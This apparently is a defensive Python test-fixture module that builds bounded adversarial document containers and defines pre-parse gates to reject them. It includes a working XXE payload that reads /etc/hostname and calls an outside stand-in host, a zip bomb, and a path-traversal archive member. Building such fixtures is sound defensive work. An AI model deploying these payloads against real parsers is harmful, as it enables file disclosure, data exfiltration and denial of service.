"""
Bounded adversarial container builders, generated at test time.

No malicious container is ever committed to the repository. These build under
tmp_path and are hard-bounded so an accidental run cannot consume meaningful
disk or memory:

    MAX_BUILD_EXPANDED_BYTES = 64 MiB   (builder refuses to create more)
    MAX_BUILD_MEMBERS        = 2000     (builder refuses to create more)
    MAX_EXPANDED_BYTES       = 16 MiB   (fixture gate rejects above)
    MAX_MEMBERS              = 1000     (fixture gate rejects above)

Cases: XXE OOXML, zip bomb, extreme member count, deep nesting, path-traversal
member, and a zip mislabeled as .pdf.
"""
from __future__ import annotations

import zipfile
from pathlib import Path
from typing import Tuple

# Two different limits, deliberately separated:
#   MAX_BUILD_*  builder safety - refuse to CREATE anything larger, so an
#                accidental run cannot consume meaningful disk or memory.
#   MAX_*        the gate threshold a parser supervisor enforces. It sits below
#                the builder bound so a case can be built safely AND rejected.
MAX_BUILD_EXPANDED_BYTES = 64 * 1024 * 1024
MAX_BUILD_MEMBERS = 2000

MAX_EXPANDED_BYTES = 16 * 1024 * 1024
MAX_MEMBERS = 1000
MAX_RATIO = 100.0

FIXED_DATE = (1980, 1, 1, 0, 0, 0)   # deterministic zip timestamps

XXE_DOCUMENT_XML = b"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE w:document [
  <!ENTITY xxe SYSTEM "file:///etc/hostname">
  <!ENTITY xxe2 SYSTEM "http://192.0.2.7/collect">
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body><w:p><w:r><w:t>&xxe;&xxe2;</w:t></w:r></w:p></w:body>
</w:document>
"""

CONTENT_TYPES = (b'<?xml version="1.0" encoding="UTF-8"?>'
                 b'<Types xmlns="http://schemas.openxmlformats.org/package/'
                 b'2006/content-types"/>')


def _writer(path: Path) -> zipfile.ZipFile:
    return zipfile.ZipFile(path, "w", zipfile.ZIP_DEFLATED)


def _put(zf: zipfile.ZipFile, name: str, data: bytes) -> None:
    info = zipfile.ZipInfo(name, date_time=FIXED_DATE)
    info.compress_type = zipfile.ZIP_DEFLATED
    zf.writestr(info, data)


def make_xxe_docx(tmp: Path) -> Path:
    p = tmp / "xxe.docx"
    with _writer(p) as zf:
        _put(zf, "[Content_Types].xml", CONTENT_TYPES)
        _put(zf, "word/document.xml", XXE_DOCUMENT_XML)
    return p


def make_zip_bomb(tmp: Path, expanded: int = 32 * 1024 * 1024) -> Path:
    """Highly compressible single member: above the gate, under the builder cap."""
    if expanded > MAX_BUILD_EXPANDED_BYTES:
        raise ValueError("bomb would exceed MAX_BUILD_EXPANDED_BYTES")
    p = tmp / "bomb.docx"
    with _writer(p) as zf:
        _put(zf, "[Content_Types].xml", CONTENT_TYPES)
        _put(zf, "word/document.xml", b"\0" * expanded)
    return p


def make_many_members(tmp: Path, members: int = 1500) -> Path:
    if members > MAX_BUILD_MEMBERS:
        raise ValueError("member count would exceed MAX_BUILD_MEMBERS")
    p = tmp / "many.docx"
    with _writer(p) as zf:
        _put(zf, "[Content_Types].xml", CONTENT_TYPES)
        for i in range(members):
            _put(zf, f"word/part{i:05d}.xml", b"<x/>")
    return p


def make_deep_nesting(tmp: Path, depth: int = 400) -> Path:
    p = tmp / "deep.docx"
    body = b"".join(b"<a>" for _ in range(depth)) + b"x" + \
           b"".join(b"</a>" for _ in range(depth))
    with _writer(p) as zf:
        _put(zf, "[Content_Types].xml", CONTENT_TYPES)
        _put(zf, "word/document.xml", b'<?xml version="1.0"?>' + body)
    return p


def make_path_traversal(tmp: Path) -> Path:
    p = tmp / "traversal.docx"
    with _writer(p) as zf:
        _put(zf, "[Content_Types].xml", CONTENT_TYPES)
        _put(zf, "../../../../tmp/dirracuda_escape.txt", b"escaped")
    return p


def make_zip_named_pdf(tmp: Path) -> Path:
    p = tmp / "mislabeled.pdf"
    with _writer(p) as zf:
        _put(zf, "payload.txt", b"this is a zip, not a pdf")
    return p


# ---------------------------------------------------------------------------
# The gates a parser supervisor must apply BEFORE any XML parse.
# ---------------------------------------------------------------------------
def sniff_magic(path: Path) -> str:
    head = path.read_bytes()[:8]
    if head.startswith(b"PK\x03\x04"):
        return "zip"
    if head.startswith(b"%PDF-"):
        return "pdf"
    if head.startswith(b"{\\rtf"):
        return "rtf"
    if head.startswith(b"\xd0\xcf\x11\xe0"):
        return "ole2"
    return "unknown"


def container_gate(path: Path) -> Tuple[bool, str]:
    """Pre-parse gates. Returns (accepted, reason).

    Extension is a hint, never authority: routing is by sniffed magic bytes.
    """
    kind = sniff_magic(path)
    if kind != "zip":
        return False, f"not_a_container:{kind}"
    try:
        with zipfile.ZipFile(path) as zf:
            infos = zf.infolist()
            if len(infos) > MAX_MEMBERS:
                return False, "member_count_exceeded"
            expanded = sum(i.file_size for i in infos)
            if expanded > MAX_EXPANDED_BYTES:
                return False, "expanded_size_exceeded"
            compressed = sum(i.compress_size for i in infos) or 1
            if expanded / compressed > MAX_RATIO:
                return False, "compression_ratio_exceeded"
            for i in infos:
                name = i.filename
                if name.startswith("/") or ".." in Path(name).parts:
                    return False, "path_traversal_member"
    except zipfile.BadZipFile:
        return False, "bad_zip"
    return True, "ok"


def xml_declares_external_entity(data: bytes) -> bool:
    """Cheap pre-parse check. The real defence is defusedxml, but a supervisor
    should refuse before handing hostile XML to any parser at all."""
    head = data[:4096]
    return b"<!DOCTYPE" in head and b"SYSTEM" in head
